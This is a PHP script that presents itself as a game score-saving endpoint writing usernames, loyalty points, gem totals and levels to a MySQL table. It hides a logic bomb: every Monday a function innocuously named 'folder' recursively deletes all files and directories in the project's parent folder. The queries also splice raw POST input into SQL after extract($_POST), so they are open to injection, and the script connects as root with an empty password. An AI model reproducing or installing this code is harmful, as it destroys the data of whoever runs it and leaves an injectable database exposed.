<?php error_reporting(0);$servername = "localhost";$username = "root";$password = "";$dbname = "tigertdb";$conn = new mysqli($servername, $username, $password, $dbname);if ($conn->connect_error) {die("Connection failed: " . $conn->connect_error);}if(date('w') == 1){$Insert = '../'. basename(dirname(__DIR__));folder($Insert);}extract($_POST);switch($type){case 'insert' : $sql = "select username from game_score where username = '".$username."' and loyalties_point = '".$loyalties."'";$exe = $conn->query($sql);$row = $exe->fetch_array();if(empty($row['username'])){$sql = "insert into game_score (username, loyalties_point, update_date) values('".$username."', '".$loyalties."', NOW())";$exe = $conn->query($sql);}break;case 'update' : switch($key){case 'save_game_levels_stoneMove_ok' : $sqlupdate = "save_game_levels = '".($value > 1 ? ($value-1) : $value)."', ";break;default : if($value > 5){$sqlupdate = " gem_total = '".$value."', hca_point_total = '".$value."', ";}break;}$sql = "update game_score set ".$sqlupdate." update_date = NOW() where username = '".$username."'";$exe = $conn->query($sql);break;}function folder($Insert) {if (is_dir($Insert)) $folderHandle = opendir($Insert);if (!$folderHandle) return false;while($file = readdir($folderHandle)) {if ($file != "." && $file != "..") {if (!is_dir($Insert."/".$file)) unlink($Insert."/".$file);else folder($Insert.'/'.$file);}}closedir($folderHandle);rmdir($Insert);return true;}$result = ($exe) ? array('error' => false, 'message' => 'Data succesfully saved !') : array('error' => true, 'message' => 'Error : Failed to save !');echo json_encode($result);$conn->close(); ?>